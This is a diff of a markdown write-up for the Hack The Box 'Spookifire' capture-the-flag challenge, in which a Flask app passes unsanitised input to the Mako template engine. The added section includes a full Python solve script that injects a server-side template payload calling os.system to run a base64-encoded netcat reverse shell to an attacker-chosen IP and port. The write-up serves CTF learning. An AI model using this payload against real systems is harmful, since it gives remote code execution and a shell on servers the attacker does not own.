@@ -8,16 +8,66 @@ tags: [htb, ctf, pentesting, web, code-auditing]
 
 <img src="../../assets/global/banner.png" alt="banner image">
 
+## Spookifire is a python flask chalenge on Hackthebox
 
 ### Description:
 
-This machine is so intresting because you have to deal with grpc protbuf to get the application working so then you can feed your burp history to find an argument that is exploitable
+Simply this challenge takes user input a print it different fornts
+but the problem is it doesn't do any sanitizing and it passes the payload to Mako tamplete Engine to be rendered.
 
-### Difficulty:
+### Vulnerable code:
+```python
+from mako.template import Template
+```
 
-`easy`
+```html
+    <tbody>
+        ${output}
+    </tbody>
 
-## Spookifire is a python flask chalenge on Hackthebox
+```
+
+### Solve:
+
+```python
+import base64
+import requests
+import argparse
+ 
+ 
+
+def solve(revshell_ip, revshell_port):
+	url = 'http://localhost:1337/'
+
+	rev = f"nc {revshell_ip} {revshell_port} -e /bin/sh"	
+	payload = base64.b64encode(rev.encode('utf-8'))
+	params = {
+		'text': f'${{self.module.runtime.util.os.system("echo {str(payload, "utf-8")} | base64 -d| sh")}}'
+	}
+ 
+	print('\n')
+	print(params)
+	print('\n')
+	try:
+		response = requests.get(url, params=params)
+		if response.status_code == 200:
+			print("Request successful!")
+			# print("Response:", response.text)
+		else:
+			print(f"Request failed with status code: {response.status_code}")
+	except requests.RequestException as e:
+		print(f"Request failed: {e}")
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='Enter your ip and port to get reverse shell.')
+    parser.add_argument('ip', type=str, help='ip to get reverse shell')
+    parser.add_argument('port', type=str, help='port to get reverse shell')
+    args = parser.parse_args()
+    solve(args.ip, args.port)
+
+```
+
+
 
 
 
